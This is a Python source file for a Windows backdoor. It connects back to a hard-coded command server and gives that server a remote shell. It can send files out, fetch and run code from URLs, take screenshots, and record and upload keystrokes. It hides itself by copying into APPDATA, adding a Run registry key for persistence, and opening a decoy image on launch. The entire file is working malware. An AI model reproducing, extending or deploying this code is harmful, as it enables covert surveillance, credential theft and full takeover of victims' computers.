import base64
import socket
import subprocess
import time
import os
import shutil
import sys
import requests
from mss import mss
import threading
import keylogger

SERVER_HOST = "192.168.100.7" 
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages

def reliable_send(cmd):
    s.send(cmd.encode())

def reliable_recv():
    cmd = s.recv(BUFFER_SIZE).decode()
    return cmd

def is_admin():
    try:
        temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\\Windows'), 'temp']))
    except:
        return "User Privillages"
    else:
        return "Administrator Privillages"

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, 'wb') as out_file:
        out_file.write(get_response.content)

def screenshot():
    with mss() as screenshot:
        screenshot.shot()

def connection():
    while True:
        time.sleep(10)
        try:
            s.connect((SERVER_HOST, SERVER_PORT))
            shell()
        except:
            connection()

def shell():

    while True:
        # Receive the command
        cmd = reliable_recv()

        if(cmd == 'q'):
            try:
                os.remove(keylogger_PATH)
            except:
                continue
            s.close()
            break

        elif(cmd == "cd" and len(cmd) == 2):
            try:
                reliable_send(os.getcwd())
            except:
                reliable_send("Cannot get current directory info")

        elif (cmd[:2] == "cd" and len(cmd) > 2):
            try:
                os.chdir(cmd[3:])
                reliable_send(os.getcwd())
            except:
                reliable_send("Directory unchanged!")
                continue

        elif (cmd[:8] == 'download'):
            # with open(cmd[9:], 'rb') as file:
            #     s.send(base64.b64encode(file.read()))
            try:
                with open(cmd[9:], 'rb') as file:
                    file_data = file.read(BUFFER_SIZE)

                    while(file_data):
                        s.send(file_data)
                        file_data = file.read(BUFFER_SIZE)
                reliable_send('file taken')
            except:
                reliable_send("[!!] Failed to download the file")

        elif (cmd[:6] == 'upload'):
            # with open(cmd[7:], 'wb') as fin:
            #     res = s.recv(BUFFER_SIZE)
            #     fin.write(base64.b64decode(res))

            with open(cmd[7:], 'wb') as fin:
                file_chunk = s.recv(BUFFER_SIZE)

                if(file_chunk[:4] == '[!!]'):
                    break
                else:
                    while(file_chunk):
                        fin.write(file_chunk)
                        if(file_chunk[-5:] == b'taken'):
                            break
                        file_chunk = s.recv(BUFFER_SIZE)

        elif (cmd[:3] == 'get'):
            try:
                download(cmd[4:])
                reliable_send(f"[+] Downloaded file from the URL {cmd[4:]}")
            except:
                reliable_send("[!!] Failed to download")

        elif (cmd[:5] == 'start'):
            try:
                subprocess.Popen(cmd[6:], shell=True)
                reliable_send(f"[+] Started {cmd[6:]}")
            except:
                reliable_send("[!!] Failed to start")

        elif (cmd[:10] == 'screenshot'):
            try:
                screenshot()
                with open('monitor-1.png', 'rb') as sc:
                    img_data = sc.read(BUFFER_SIZE)

                    while(img_data):
                        s.send(img_data)
                        img_data = sc.read(BUFFER_SIZE)
                os.remove('monitor-1.png')
                reliable_send('Screenshot taken')
            except:
                reliable_send("[!!] Failed to take screenshot")
        
        elif (cmd[:5] == 'check'):
            try:
                message = is_admin()
                reliable_send(message)
            except:
                reliable_send("[!!] Can't perform the check")

        elif (cmd[:12] == 'keylog_start'):
            thread1 = threading.Thread(target=keylogger.start)
            thread1.start()

        elif (cmd[:11] == 'keylog_dump'):
            try:
                with open(keylogger_PATH, 'rb') as file:
                    file_data = file.read(BUFFER_SIZE)

                    while(file_data):
                        s.send(file_data)
                        file_data = file.read(BUFFER_SIZE)
                reliable_send('eof')
            except:
                reliable_send("[!!] Failed to download the keylog")         
                
        else:
            try:
                output = subprocess.getoutput(cmd)
                if not output:
                    output = "No respose generated"
                reliable_send(output)
            except ValueError:
                reliable_send(bytes("[!!] Can't execute that command", 'utf-8'))

location = os.environ["appdata"] + "\\backdoor.exe"
keylogger_PATH = os.environ["appdata"] + "\\keylogger.txt"

if not os.path.exists(location):
    # Copy the executable file to the location
    shutil.copyfile(sys.executable, location)

    # Change reg entries
    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)

    # Setting up an image to open on launch
    path = sys._MEIPASS + '\img.jpg'
    try:
        subprocess.Popen(path, shell=True)
    except:
        pass

# Declare socket
s = socket.socket()
connection()